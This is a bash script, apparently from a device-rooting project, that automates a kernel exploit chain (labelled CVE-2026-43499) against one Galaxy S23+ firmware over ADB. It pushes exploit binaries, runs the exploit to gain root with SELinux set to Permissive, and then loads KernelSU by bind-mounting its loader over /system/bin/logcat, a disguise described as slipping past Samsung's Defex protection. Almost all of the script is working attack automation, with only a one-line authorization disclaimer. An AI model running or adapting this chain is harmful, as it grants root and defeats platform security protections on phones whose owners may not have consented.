#!/usr/bin/env bash
# Root a Galaxy S23+ (SM-S916B) on the exact firmware S916BXXUAGZIF from
# the ADB shell domain and hand off to the KernelSU late-load loader.
#
# Automates the per-boot sequence documented in
# artifacts/dm2q-S916BXXUAGZIF/README.md. That sequence is device-tested
# on the FZI1 sibling profile (S916BXXSAFZI1); the AGZIF artifacts
# themselves are still pending hardware validation. Everything is
# volatile: a reboot removes root and the KernelSU module; rerun this
# script after each boot.
#
# Usage:
#   tools/root-dm2q-S916BXXUAGZIF.sh
#
# Environment:
#   ANDROID_SERIAL  choose the device when several are attached
#
# Exit codes:
#   0  full chain succeeded (KernelSU live, su granted)
#   1  failure; reboot the phone and rerun
#   3  KernelSU module live but su not granted yet (see on-screen prompt)
#   4  root-only chain succeeded; KernelSU deferred because this
#      profile's ksud audit verdict (KSU_AUDIT below) is not PASS
#
# Use only on devices you own or are explicitly authorized to test.
set -uo pipefail

FIRMWARE=S916BXXUAGZIF
PROFILE=dm2q-S916BXXUAGZIF
REMOTE_DIR=/data/local/tmp
REMOTE_SO=$REMOTE_DIR/dm2q.so
REMOTE_ROOT=$REMOTE_DIR/cve-2026-43499-root
REMOTE_KSUD=$REMOTE_DIR/ksud-s25u-kdp
REMOTE_LOG=$REMOTE_DIR/dm2q-agzif.log
KSUD_LATE_LOG=$REMOTE_DIR/ksud-late.log
POST_BOOT_SETTLE_SEC=60

# Three-gate ksud audit verdict for this profile, recorded in
# docs/SM-S916B-S916BXXUAGZIF.md (section "KernelSU handoff"). With PASS
# the ksud loader is pushed, staged, and late-loaded exactly as on FZI1.
# With any other value the ksud preflight verify and the whole KSU
# push/stage/late-load stage are skipped and the script exits 4 after a
# successful root-only chain.
KSU_AUDIT=PASS

APP_SO_SHA=36bc2c82ebf5bee292af525b09abd19ef620299a26991c36d50f5c70bf401e7f
ROOT_SHA=85dff87b6021c2d1bede8335343e74dc39b165182595fbfb8373bec62318e914
KSUD_SHA=5da5818d36da2d589496f91016078a43f50489e5c98b319db4eaa5ee475b86bd

REPO_ROOT=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)
APP_SO=$REPO_ROOT/artifacts/$PROFILE/cve-2026-43499-app.so
ROOT_HELPER=$REPO_ROOT/artifacts/$PROFILE/cve-2026-43499-root
KSUD=$REPO_ROOT/kernelsu/ksud-dm2q-S916BXXSAFZG1-kdp

die() { printf 'error: %s\n' "$*" >&2; exit 1; }
step() { printf '\n=== %s ===\n' "$*"; }
strip_cr() { printf '%s' "$1" | tr -d '\r'; }

hash_of() {
  if command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$1" | awk '{print $1}'
  else
    shasum -a 256 "$1" | awk '{print $1}'
  fi
}

verify_artifact() {
  [ -f "$1" ] || die "missing artifact: $1"
  actual=$(hash_of "$1") || die "cannot hash $1"
  [ "$actual" = "$2" ] || die "sha256 mismatch for $1 (expected $2, got $actual)"
}

root_daemon_cmd() {
  adb shell "$REMOTE_ROOT -c '$1'"
}

step 'Preflight'
command -v adb >/dev/null 2>&1 || die 'adb not found in PATH'
serials=$(adb devices | awk 'NR>1 && $2=="device"{print $1}')
[ -n "$serials" ] || die 'no adb device visible; enable USB debugging and reconnect'
if [ -z "${ANDROID_SERIAL:-}" ] && [ "$(printf '%s\n' "$serials" | awk 'END{print NR}')" -gt 1 ]; then
  die 'multiple devices attached; set ANDROID_SERIAL to choose one'
fi
fingerprint=$(strip_cr "$(adb shell 'getprop ro.build.fingerprint')")
case $fingerprint in
  *"$FIRMWARE"*) ;;
  *) die "device is on '$fingerprint'; this payload is exact-firmware bound to $FIRMWARE" ;;
esac
verify_artifact "$APP_SO" "$APP_SO_SHA"
verify_artifact "$ROOT_HELPER" "$ROOT_SHA"
if [ "$KSU_AUDIT" = PASS ]; then
  verify_artifact "$KSUD" "$KSUD_SHA"
fi
uptime_sec=$(strip_cr "$(adb shell 'cat /proc/uptime')" | awk '{print $1}')
settle=$(awk -v up="$uptime_sec" -v want="$POST_BOOT_SETTLE_SEC" \
  'BEGIN{s=want-up; if(s<0)s=0; printf "%d", s}')
if [ "$settle" -gt 0 ]; then
  printf 'fresh boot; waiting %ss for the system to settle...\n' "$settle"
  sleep "$settle"
fi

step 'Pushing payloads'
adb push "$APP_SO" "$REMOTE_SO" || die 'push of cve-2026-43499-app.so failed'
adb push "$ROOT_HELPER" "$REMOTE_ROOT" || die 'push of cve-2026-43499-root failed'
if [ "$KSU_AUDIT" = PASS ]; then
  adb push "$KSUD" "$REMOTE_KSUD" || die 'push of ksud failed'
  adb shell "chmod 755 $REMOTE_ROOT $REMOTE_KSUD" || die 'chmod on device failed'
else
  adb shell "chmod 755 $REMOTE_ROOT" || die 'chmod on device failed'
fi

step 'Running exploit (single attempt, can take up to ~10 minutes)'
if ! adb shell "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 $REMOTE_ROOT --run-payload $REMOTE_SO $REMOTE_ROOT $REMOTE_LOG"; then
  adb shell "tail -n 50 $REMOTE_LOG" || true
  die 'exploit attempt failed; reboot the phone and rerun (in-boot retries are refused by design)'
fi

step 'Verifying exploit root'
root_id=$(strip_cr "$(root_daemon_cmd 'id; getenforce')" || true)
printf '%s\n' "$root_id"
case $root_id in *uid=0*) ;; *) die 'exploit daemon is not root; reboot the phone and rerun' ;; esac
case $root_id in *Permissive*) ;; *) die 'SELinux is not Permissive; reboot the phone and rerun' ;; esac

if [ "$KSU_AUDIT" != PASS ]; then
  printf '%s\n' \
    'KernelSU is deferred: the ksud audit verdict for this profile is not PASS.' \
    'The root-only chain succeeded; everything is volatile until reboot.' \
    'See docs/SM-S916B-S916BXXUAGZIF.md, section "KernelSU handoff", for the audit outcome.'
  exit 4
fi

step 'Staging ksud'
root_daemon_cmd "cp $REMOTE_KSUD $REMOTE_DIR/.ksud-stage; chmod 755 $REMOTE_DIR/.ksud-stage" \
  || die 'staging .ksud-stage failed'

step 'KernelSU late-load (logcat-disguised)'
# Defex kills direct ksud execution from /data/local/tmp; only the bind-mount
# disguise inside a private mount namespace loads the module. The module load
# re-enforces SELinux, so this must complete while still Permissive.
root_daemon_cmd "unshare -m sh -c \"mount --bind $REMOTE_KSUD /system/bin/logcat && exec logcat late-load --package-name me.weishu.kernelsu\" > $KSUD_LATE_LOG 2>&1" \
  || die 'late-load invocation failed'
modules=$(strip_cr "$(adb shell 'grep kernelsu /proc/modules')" || true)
if ! printf '%s' "$modules" | grep -q kernelsu; then
  adb shell "tail -n 40 $KSUD_LATE_LOG" || true
  die 'kernelsu module is not live; see ksud-late.log tail above'
fi
printf '%s\n' "$modules"

step 'Verifying su (accept the prompt in KernelSU Manager if it appears)'
for attempt in 1 2 3 4 5 6; do
  su_id=$(strip_cr "$(adb shell 'su -c id')" || true)
  if printf '%s' "$su_id" | grep -q 'uid=0'; then
    printf '%s\n' "$su_id"
    printf '\nDone: exploit root, KernelSU module live, su granted. All volatile until reboot.\n'
    exit 0
  fi
  printf 'su not granted yet (%d/6), waiting 5s...\n' "$attempt"
  sleep 5
done
printf 'KernelSU module is live but su is not granted yet. Open KernelSU Manager, grant the superuser request, then check with: adb shell su -c id\n'
exit 3
